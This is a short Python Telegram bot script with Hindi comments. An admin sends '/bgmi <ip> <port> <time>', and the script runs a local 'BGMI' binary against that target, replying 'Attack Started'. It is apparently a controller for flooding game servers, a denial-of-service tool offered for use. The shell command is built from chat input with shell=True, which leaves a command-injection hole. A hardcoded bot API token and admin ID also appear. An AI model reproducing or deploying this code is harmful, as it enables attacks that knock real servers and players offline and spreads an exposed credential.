import telebot
import subprocess
import os

# अपना असली टोकन यहाँ डालें (inverted commas के अंदर)
API_TOKEN = '8299856147:AAEwD_62b1FYhrGVSwKoZJPMmQzFLdtm1Ds'
ADMIN_ID = 6144822538  # आपकी एडमिन आईडी

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "🚀 BGMI Bot GitHub पर चालू है!\nउपयोग: /bgmi <ip> <port> <time>")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    # यह चेक करता है कि क्या मैसेज भेजने वाला आप (Admin) ही हैं
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"❌ Access Denied! आपकी ID: {message.from_user.id}")
        return

    command = message.text.split()
    if len(command) == 4:
        target, port, duration = command[1], command[2], command[3]
        
        bot.reply_to(message, f"🚀 Attack Started on {target}:{port} for {duration}s")
        
        # यह 'BGMI' बाइनरी को चलाएगा जो BGMI.c से कंपाइल हुई है[cite: 1]
        full_command = f"./BGMI {target} {port} {duration} 10000 50000"
        
        try:
            subprocess.run(full_command, shell=True)
            bot.send_message(message.chat.id, f"✅ Target {target} Finished!")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.reply_to(message, "Usage: /bgmi <ip> <port> <time>")

print("Bot is running...")
bot.polling()
